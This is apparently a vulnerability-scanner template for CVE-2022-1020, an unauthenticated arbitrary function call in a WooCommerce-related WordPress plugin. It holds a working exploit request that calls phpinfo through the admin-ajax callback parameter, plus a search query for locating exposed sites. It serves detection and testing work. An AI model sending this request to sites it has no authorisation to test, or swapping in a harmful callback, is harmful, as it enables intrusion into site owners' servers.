id: CVE-2022-1020

info:
  name: WordPress WooCommerce <3.1.2 - Arbitrary Function Call
  author: Akincibor
  severity: critical
  verified: true  
  description: WordPress WooCommerce plugin before 3.1.2 does not have authorisation and CSRF checks in the wpt_admin_update_notice_option 
    AJAX action (available to both unauthenticated and authenticated users), as well as does not validate the 
    callback parameter, allowing unauthenticated attackers to call arbitrary functions with either none or one user controlled argument.
    fofa title="WordPress WooCommerce "

  reference:
    - https://wpscan.com/vulnerability/04fe89b3-8ad1-482f-a96d-759d1d3a0dd5
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1020

rules:
  r0:
    request:
      method: POST
      path: /wp-admin/admin-ajax.php?action=wpt_admin_update_notice_option
      body: option_key=a&perpose=update&callback=phpinfo
    expression: response.status == 200 && response.body.bcontains(b'PHP Extension')&& response.body.bcontains(b'PHP Version') && r'>PHP Version <\/td><td class="v">([0-9.]+)'.bmatches(response.body)
expression: r0()